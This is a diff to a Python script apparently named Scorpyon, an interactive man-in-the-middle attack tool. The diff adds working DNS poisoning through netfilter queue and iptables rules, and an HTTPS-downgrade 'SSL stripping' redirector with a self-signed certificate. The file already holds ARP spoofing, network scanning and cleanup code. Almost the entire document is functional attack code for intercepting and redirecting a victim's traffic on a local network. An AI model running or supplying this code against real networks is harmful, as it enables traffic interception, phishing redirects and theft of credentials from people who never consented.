@@ -9,9 +9,51 @@ import os
 import atexit
 import signal
 import threading
+import errno
+import http.server
+import socketserver
+import ssl
+import subprocess
+from typing import Optional
+
+# network
+HTTPS_PORT = 443
+NETWORK_SCAN_TIMEOUT = 10
+ARP_REQUEST_TIMEOUT = 2
+ARP_REQUEST_RETRIES = 2
+DNS_SPOOF_TTL = 10
+NETWORK_SUBNET = "/24"
+
+# netfilter queue
+NFQUEUE_NUM = 0
+
+# thread timeouts
+THREAD_JOIN_TIMEOUT_SHORT = 2
+THREAD_JOIN_TIMEOUT_MEDIUM = 3
+THREAD_JOIN_TIMEOUT_LONG = 5
+HTTP_SERVER_TIMEOUT = 1.0
+
+# arp spoofing
+ARP_SPOOF_INTERVAL = 2  # seconds between spoof packets
+ARP_RESTORE_COUNT = 4   # packets sent when restoring ARP
+
+# dns thrads
+DNS_POLL_INTERVAL = 0.01
+
+# ssl certs
+SSL_CERT_FILE = "/tmp/sslstrip_cert.pem"
+SSL_KEY_FILE = "/tmp/sslstrip_key.pem"
+
+# ansi escape codes (menu ui)
+ANSI_MOVE_UP = '\033[A'
+ANSI_CLEAR_LINE = '\033[2K'
+
+
 
 website_to_spoof = ""
 spoof_ip = ""
+
+#cleanup state logging
 
 cleanup_state = {
     'ip_forward_enabled': False,
@@ -19,26 +61,47 @@ cleanup_state = {
     'target_ip': None,
     'gateway_ip': None,
     'arp_thread': None,
-    'arp_running': False
+    'arp_running': False,
+    'dns_thread': None,
+    'dns_running': False,
+    'dns_queue': None,
+    'ssl_strip_thread': None,
+    'ssl_strip_running': False,
+    'ssl_httpd': None
 }
+
+# all the services must be properly stopped and the system state restored
 
 def cleanup():
     try:
         print("\n[Cleanup] Restoring system state...")
+        #stop ssl stripping
+        if cleanup_state['ssl_strip_running']:
+            cleanup_state['ssl_strip_running'] = False
+            print("[Cleanup] SSL stripping stopped")
+        #stop dns poisoning
+        if cleanup_state['dns_running']:
+            cleanup_state['dns_running'] = False
+            if cleanup_state['dns_queue']:
+                try:
+                    cleanup_state['dns_queue'].unbind()
+                except Exception:
+                    pass
+            print("[Cleanup] DNS poisoning stopped")
         #stop arp spoofing
         if cleanup_state['arp_running']:
             cleanup_state['arp_running'] = False
             if cleanup_state['arp_thread']:
-                cleanup_state['arp_thread'].join(timeout=2)
+                cleanup_state['arp_thread'].join(timeout=THREAD_JOIN_TIMEOUT_SHORT)
         #disable ip forwardin
         if cleanup_state['ip_forward_enabled']:
             os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
             print("[Cleanup] IP forwarding disabled")
         #resetting firewall rules (removing what we add)
         if cleanup_state['iptables_set']:
-            os.system("iptables -D FORWARD -j NFQUEUE --queue-num 0 2>/dev/null")
-            os.system("iptables -D INPUT -j NFQUEUE --queue-num 0 2>/dev/null")
-            os.system("iptables -D OUTPUT -j NFQUEUE --queue-num 0 2>/dev/null")
+            os.system(f"iptables -D FORWARD -j NFQUEUE --queue-num {NFQUEUE_NUM} 2>/dev/null")
+            os.system(f"iptables -D INPUT -j NFQUEUE --queue-num {NFQUEUE_NUM} 2>/dev/null")
+            os.system(f"iptables -D OUTPUT -j NFQUEUE --queue-num {NFQUEUE_NUM} 2>/dev/null")
             print("[Cleanup] iptables rules removed")
         #restore arp tables
         if cleanup_state['target_ip'] and cleanup_state['gateway_ip']:
@@ -51,43 +114,49 @@ def cleanup():
     except Exception as e:
         print(f"[Cleanup] Error: {e}")
 
+# signal handler to ensure cleanup on exit
+
 def signal_handler(sig, frame):
     print(f"\n[Signal] Received signal {sig}, cleaning up...")
     cleanup()
     sys.exit(0)
 
+# process packet function for netfilter queue
+
 def process_packet(packet):
     global website_to_spoof, spoof_ip
-    scapy_packet = scapy.IP(packet.get_payload())
-    if scapy_packet.haslayer(scapy.DNSQR):
+    scapy_packet = scapy.IP(packet.get_payload()) # converts to scapy packet
+    if scapy_packet.haslayer(scapy.DNSQR): # check if packet is for dns
         qname = scapy_packet[scapy.DNSQR].qname
-        if website_to_spoof in qname.decode():
+        if website_to_spoof in qname.decode(): # check if domain is the same as the one we want to spoof
             print(f"[DNS] Spoofing {qname.decode()}")
             
             spoofed_packet = scapy.IP(dst=scapy_packet[scapy.IP].src, src=scapy_packet[scapy.IP].dst) / \
                              scapy.UDP(dport=scapy_packet[scapy.UDP].sport, sport=scapy_packet[scapy.UDP].dport) / \
                              scapy.DNS(id=scapy_packet[scapy.DNS].id, qr=1, aa=1, qd=scapy_packet[scapy.DNS].qd, \
-                                     an=scapy.DNSRR(rrname=qname, ttl=10, rdata=spoof_ip))
+                                     an=scapy.DNSRR(rrname=qname, ttl=DNS_SPOOF_TTL, rdata=spoof_ip)) # create spoofed packet
             
-            scapy.send(spoofed_packet, verbose=False)
-            packet.drop()
+            scapy.send(spoofed_packet, verbose=False) # send spoofed packet
+            packet.drop() # drop original packet
             return
 
-    packet.accept()
+    packet.accept() # accept original packet if it is not for dns
+
+# scan network for ip addresses, mac and vendor (just use nmap for this but i thought it was fun to implement)
 
 def scan_network():
     try:
         local_ip=scapy.get_if_addr(scapy.conf.iface)
-        network_range=ipaddress.ip_network(f"{local_ip}/24", strict=False)
+        network_range=ipaddress.ip_network(f"{local_ip}{NETWORK_SUBNET}", strict=False)
     except Exception as e:
         print(f"Could not determine network range: {e}")
         return
     print(f"Scanning {network_range}...")
     arp_request=scapy.ARP(pdst=str(network_range))
     broadcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
-    packet=broadcast / arp_request
+    packet=broadcast/arp_request # we scan by broadcasting an arp request
     try:
-        answered, unanswered=scapy.srp(packet, timeout=10, verbose=False)
+        answered, unanswered=scapy.srp(packet, timeout=NETWORK_SCAN_TIMEOUT, verbose=False)
     except PermissionError:
         print("Permission denied. Run as root/Administrator.")
         return
@@ -102,24 +171,30 @@ def scan_network():
             vendor = "Unknown"
         print(colored(f"{client['ip']}", 'blue'),f"\t\t{client['mac']}",f"\t\t{vendor}")
 
+# get mac address of a host
+
 def get_mac(ip):
     arp_req=scapy.ARP(pdst=ip)
     broadcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
     arp_req_broadcast=broadcast/arp_req
-    answered_list=scapy.srp(arp_req_broadcast, timeout=2, retry=2, verbose = False)[0]
+    answered_list=scapy.srp(arp_req_broadcast, timeout=ARP_REQUEST_TIMEOUT, retry=ARP_REQUEST_RETRIES, verbose = False)[0]
     if answered_list:
         return answered_list[0][1].hwsrc
     else:
         return None
+
+#arp spoofing
 
 def spoof(target_ip, spoof_ip):
     target_mac=get_mac(target_ip)
     if not target_mac:
         print(f"\n[ARP] Could not find MAC for {target_ip}. Host may be down.")
         return False
-    packet=scapy.Ether(dst=target_mac)/scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    packet=scapy.Ether(dst=target_mac)/scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip) # creates an arp response packet
     scapy.sendp(packet, verbose = False)
     return True
+
+# restore arp tables
 
 def restore(destination_ip, source_ip):
     destination_mac=get_mac(destination_ip)
@@ -128,7 +203,9 @@ def restore(destination_ip, source_ip):
         print(f"[ARP] Warning: Could not restore ARP for {destination_ip}")
         return
     packet=scapy.Ether(dst=destination_mac)/scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
-    scapy.sendp(packet, count=4, verbose=False)
+    scapy.sendp(packet, count=ARP_RESTORE_COUNT, verbose=False)
+
+# arp spoofing thread
 
 def arp_spoof_thread(target_ip, gateway_ip):
     sent_packets = 0
@@ -137,7 +214,7 @@ def arp_spoof_thread(target_ip, gateway_ip):
     while cleanup_state['arp_running']:
         if spoof(target_ip, gateway_ip) and spoof(gateway_ip, target_ip):
             sent_packets += 2
-        time.sleep(2)
+        time.sleep(ARP_SPOOF_INTERVAL)
     print(f"\n[ARP] Spoofing thread stopped")
 
 def start_arp_spoofing():
@@ -174,7 +251,7 @@ def start_arp_spoofing():
         target=arp_spoof_thread, 
         args=(target_ip, gateway_ip),
         daemon=True
-    )
+    ) # creates a thread for arp spoofing such that we can do other stuff while it runs
     cleanup_state['arp_thread'].start()
     print("[ARP] ARP spoofing started in background")
     print("[ARP] You can now start DNS poisoning or other attacks")
@@ -188,7 +265,7 @@ def stop_arp_spoofing():
     cleanup_state['arp_running'] = False
     
     if cleanup_state['arp_thread']:
-        cleanup_state['arp_thread'].join(timeout=5)
+        cleanup_state['arp_thread'].join(timeout=THREAD_JOIN_TIMEOUT_LONG)
     
     if cleanup_state['target_ip'] and cleanup_state['gateway_ip']:
         restore(cleanup_state['target_ip'], cleanup_state['gateway_ip'])
@@ -204,11 +281,37 @@ def stop_arp_spoofing():
     cleanup_state['gateway_ip'] = None
     print("[ARP] Done.")
 
+# dns poisoning thread
+
+def dns_poison_thread():
+    """Background thread for DNS poisoning."""
+    try:
+        queue = NetfilterQueue()
+        cleanup_state['dns_queue'] = queue
+        queue.bind(NFQUEUE_NUM, process_packet)
+        
+        while cleanup_state['dns_running']:
+            try:
+                queue.run(block=False)
+            except Exception:
+                pass
+            time.sleep(DNS_POLL_INTERVAL)  # Small sleep to prevent CPU spinning
+            
+    except Exception as e:
+        print(f"[DNS] Error in DNS thread: {e}")
+    finally:
+        cleanup_state['dns_running'] = False
+        print("[DNS] Thread stopped.")
+
 def start_dns_poisoning():
     global website_to_spoof, spoof_ip
     
     if os.geteuid() != 0:
         print("This action requires root privileges. Please run as root.")
+        return
+    
+    if cleanup_state['dns_running']:
+        print("[DNS] DNS poisoning is already running!")
         return
     
     if not cleanup_state['arp_running']:
@@ -219,36 +322,236 @@ def start_dns_poisoning():
             return
     
     website_to_spoof = input("Enter the website to spoof (e.g., google.com): ")
-    spoof_ip = input("Enter the IP to redirect to: ")
+    spoof_ip = input("Enter the IP to redirect to (your IP): ")
     
+    if not cleanup_state['ip_forward_enabled']:
+        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+        cleanup_state['ip_forward_enabled'] = True
+    
+    print("[DNS] Setting up iptables rules...")
+    os.system(f"iptables -I FORWARD -j NFQUEUE --queue-num {NFQUEUE_NUM}")
+    os.system(f"iptables -I INPUT -j NFQUEUE --queue-num {NFQUEUE_NUM}")
+    os.system(f"iptables -I OUTPUT -j NFQUEUE --queue-num {NFQUEUE_NUM}")
     cleanup_state['iptables_set'] = True
     
+    cleanup_state['dns_running'] = True
+    cleanup_state['dns_thread'] = threading.Thread(
+        target=dns_poison_thread,
+        daemon=True
+    )
+    cleanup_state['dns_thread'].start()
+    
+    print(f"[DNS] DNS poisoning started in background: {website_to_spoof} -> {spoof_ip}")
+    print("[DNS] You can now start SSL stripping or other attacks")
+
+def stop_dns_poisoning():
+    """Stop DNS poisoning."""
+    if not cleanup_state['dns_running']:
+        print("[DNS] DNS poisoning is not running")
+        return
+    
+    print("[DNS] Stopping DNS poisoning...")
+    cleanup_state['dns_running'] = False
+    if cleanup_state['dns_queue']:
+        try:
+            cleanup_state['dns_queue'].unbind()
+        except Exception:
+            pass
+        cleanup_state['dns_queue'] = None
+    
+    if cleanup_state['dns_thread']:
+        cleanup_state['dns_thread'].join(timeout=THREAD_JOIN_TIMEOUT_MEDIUM)
+        cleanup_state['dns_thread'] = None
+    os.system(f"iptables -D FORWARD -j NFQUEUE --queue-num {NFQUEUE_NUM} 2>/dev/null")
+    os.system(f"iptables -D INPUT -j NFQUEUE --queue-num {NFQUEUE_NUM} 2>/dev/null")
+    os.system(f"iptables -D OUTPUT -j NFQUEUE --queue-num {NFQUEUE_NUM} 2>/dev/null")
+    cleanup_state['iptables_set'] = False
+    
+    print("[DNS] Done.")
+
+# ssl stripping
+
+class _RedirectHandler(http.server.BaseHTTPRequestHandler):
+    # http server handler that redirects https to http
+    target_host: Optional[str] = None
+
+    def log_message(self, format, *args):
+        return
+
+    def do_GET(self):
+        print(f"[SSL] Redirecting HTTPS request from {self.client_address[0]} to http://{self.target_host}")
+        self.send_response(301)
+        self.send_header("Location", f"http://{self.target_host}")
+        self.end_headers()
+
+    def do_POST(self):
+        self.do_GET()
+
+
+def _ensure_self_signed_cert(cert_file: str, key_file: str) -> None:
+    # generate a self-signed certificate if it doesn't exist
+    if os.path.exists(cert_file) and os.path.exists(key_file):
+        return
+    print("[SSL] Generating self-signed certificate...")
+    subprocess.run(
+        [
+            "openssl",
+            "req",
+            "-x509",
+            "-newkey",
+            "rsa:2048",
+            "-keyout",
+            key_file,
+            "-out",
+            cert_file,
+            "-days",
+            "1",
+            "-nodes",
+            "-subj",
+            "/CN=sslstrip",
+        ],
+        check=False,
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL,
+    )
+    print("[SSL] Certificate generated.")
+
+
+def _ssl_strip_thread(bind_ip: str, site_to_spoof: str, cert_file: str, key_file: str) -> None:
+    _RedirectHandler.target_host = site_to_spoof
+    socketserver.TCPServer.allow_reuse_address = True
+    
     try:
-        if not cleanup_state['ip_forward_enabled']:
-            os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
-            cleanup_state['ip_forward_enabled'] = True
+        httpd = socketserver.TCPServer((bind_ip, HTTPS_PORT), _RedirectHandler)
+        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+        context.load_cert_chain(certfile=cert_file, keyfile=key_file)
+        httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
+        cleanup_state['ssl_httpd'] = httpd
         
-        print("[DNS] Setting up iptables rules...")
-        os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")
-        os.system("iptables -I INPUT -j NFQUEUE --queue-num 0")
-        os.system("iptables -I OUTPUT -j NFQUEUE --queue-num 0")
-        print(f"[DNS] Starting DNS spoofer for {website_to_spoof} -> {spoof_ip}")
-        print("[DNS] Press Ctrl+C to stop...")
+        print(f"[SSL] Listening on {bind_ip}:{HTTPS_PORT} and redirecting to http://{site_to_spoof}")
+        print("[SSL] SSL stripping running in background. Return to menu.")
         
-        queue = NetfilterQueue()
-        queue.bind(0, process_packet)
-        queue.run()
+        httpd.timeout = HTTP_SERVER_TIMEOUT
         
-    except KeyboardInterrupt:
-        print("\n[DNS] Stopping DNS spoofer...")
+        while cleanup_state['ssl_strip_running']:
+            httpd.handle_request()
+        
+        httpd.server_close()
+        cleanup_state['ssl_httpd'] = None
+        print("[SSL] Server stopped.")
+        
+    except OSError as exc:
+        if exc.errno == errno.EADDRNOTAVAIL:
+            print(f"[SSL] Cannot bind to {bind_ip}. Address not available.")
+        elif exc.errno == errno.EACCES:
+            print(f"[SSL] Permission denied binding to port {HTTPS_PORT}. Run with sudo/root.")
+        elif exc.errno == errno.EADDRINUSE:
+            print(f"[SSL] Port {HTTPS_PORT} is already in use.")
+        else:
+            print(f"[SSL] Failed to start HTTPS redirector: {exc}")
+        cleanup_state['ssl_strip_running'] = False
     except Exception as e:
-        print(f"[DNS] An error occurred: {e}")
-    finally:
-        os.system("iptables -D FORWARD -j NFQUEUE --queue-num 0 2>/dev/null")
-        os.system("iptables -D INPUT -j NFQUEUE --queue-num 0 2>/dev/null")
-        os.system("iptables -D OUTPUT -j NFQUEUE --queue-num 0 2>/dev/null")
-        cleanup_state['iptables_set'] = False
-        print("[DNS] Done.")
+        print(f"[SSL] Error in SSL strip thread: {e}")
+        cleanup_state['ssl_strip_running'] = False
+
+
+def start_ssl_stripping():
+    if os.geteuid() != 0:
+        print("This action requires root privileges. Please run as root.")
+        return
+    
+    if cleanup_state['ssl_strip_running']:
+        print("[SSL] SSL stripping is already running!")
+        return
+    
+    if not cleanup_state['arp_running']:
+        print("[SSL] Warning: ARP spoofing is not running!")
+        print("[SSL] Start ARP spoofing first to intercept traffic")
+        choice = input("[SSL] Continue anyway? (y/n): ")
+        if choice.lower() != 'y':
+            return
+    
+    site_to_spoof = input("Enter the website to strip SSL from (e.g., example.com): ")
+    try:
+        bind_ip = scapy.get_if_addr(scapy.conf.iface)
+    except Exception:
+        bind_ip = input("Could not auto-detect IP. Enter bind IP: ")
+    
+    if not bind_ip or bind_ip == "0.0.0.0":
+        bind_ip = input("Enter the IP to bind to: ")
+    
+    cert_file = SSL_CERT_FILE
+    key_file = SSL_KEY_FILE
+    
+    print(f"[SSL] SSL STRIP")
+    print(f"[SSL] Interface: {scapy.conf.iface}")
+    print(f"[SSL] Binding HTTPS redirector on {bind_ip}:{HTTPS_PORT}")
+    print(f"[SSL] Redirect target: http://{site_to_spoof}")
+    
+    _ensure_self_signed_cert(cert_file, key_file)
+    
+    cleanup_state['ssl_strip_running'] = True
+    
+    cleanup_state['ssl_strip_thread'] = threading.Thread(
+        target=_ssl_strip_thread,
+        args=(bind_ip, site_to_spoof, cert_file, key_file),
+        daemon=True
+    )
+    cleanup_state['ssl_strip_thread'].start()
+    print("[SSL] SSL stripping started in background")
+
+
+def stop_ssl_stripping():
+    """Stop SSL stripping."""
+    if not cleanup_state['ssl_strip_running']:
+        print("[SSL] SSL stripping is not running")
+        return
+    
+    print("[SSL] Stopping SSL stripping...")
+    cleanup_state['ssl_strip_running'] = False
+    
+    if cleanup_state['ssl_strip_thread']:
+        cleanup_state['ssl_strip_thread'].join(timeout=THREAD_JOIN_TIMEOUT_MEDIUM)
+        cleanup_state['ssl_strip_thread'] = None
+    
+    print("[SSL] Done.")
+
+menu_lines_count = 0
+
+# ui part
+
+def clear_menu_lines(num_lines):
+    for _ in range(num_lines):
+        sys.stdout.write(f'{ANSI_MOVE_UP}\r{ANSI_CLEAR_LINE}')
+    sys.stdout.flush()
+
+def print_menu(clear_previous=True):
+    global menu_lines_count
+    
+    if clear_previous and menu_lines_count > 0:
+        clear_menu_lines(menu_lines_count)
+    lines = []
+    lines.append(colored("\n[...Scorpyon...]", 'green'))
+    if not cleanup_state['arp_running']:
+        lines.append("1. Start ARP spoofing (background)")
+    else:
+        lines.append("1. Stop ARP spoofing")
+    if not cleanup_state['dns_running']:
+        lines.append("2. Start DNS poisoning")
+    else:
+        lines.append("2. Stop DNS poisoning")
+    if not cleanup_state['ssl_strip_running']:
+        lines.append("3. Start SSL stripping")
+    else:
+        lines.append("3. Stop SSL stripping")
+    lines.append("4. Scan network")
+    lines.append("5. Exit")
+    lines.append("")
+
+    for line in lines:
+        print(line)
+    
+    menu_lines_count = len(lines) + 1
 
 def main():
     atexit.register(cleanup)
@@ -285,31 +588,36 @@ def main():
     """, 'green'))
     
     while True:
-        print(colored("\n[...Scorpyon...]", 'green'))
-        if not cleanup_state['arp_running']:
-            print("1. Start ARP spoofing (background)")
-        if cleanup_state['arp_running']:
-            print("1. Stop ARP spoofing")
-        print("2. Start DNS poisoning")
-        print("3. Scan network")
-        print("4. Exit\n")
-        choice=input("> ")    
-        
-        if choice=='1' and not cleanup_state['arp_running']:
+        global menu_lines_count
+        print_menu()
+        choice = input("> ")
+        clear_menu_lines(menu_lines_count)
+        menu_lines_count = 0
+        if choice == '1' and not cleanup_state['arp_running']:
             start_arp_spoofing()
         elif choice == '1' and cleanup_state['arp_running']:
             stop_arp_spoofing()
-        elif choice == '2':
+        elif choice == '2' and not cleanup_state['dns_running']:
             start_dns_poisoning()
-        elif choice == '3':
-            scan_network()
+        elif choice == '2' and cleanup_state['dns_running']:
+            stop_dns_poisoning()
+        elif choice == '3' and not cleanup_state['ssl_strip_running']:
+            start_ssl_stripping()
+        elif choice == '3' and cleanup_state['ssl_strip_running']:
+            stop_ssl_stripping()
         elif choice == '4':
+            scan_network()
+        elif choice == '5':
             if cleanup_state['arp_running']:
                 print("Stopping ARP spoofing before exit...")
                 stop_arp_spoofing()
+            if cleanup_state['dns_running']:
+                print("Stopping DNS poisoning before exit...")
+                stop_dns_poisoning()
+            if cleanup_state['ssl_strip_running']:
+                print("Stopping SSL stripping before exit...")
+                stop_ssl_stripping()
             break
-        else:
-            print("Invalid choice.")
 
 if __name__ == "__main__":
     main()
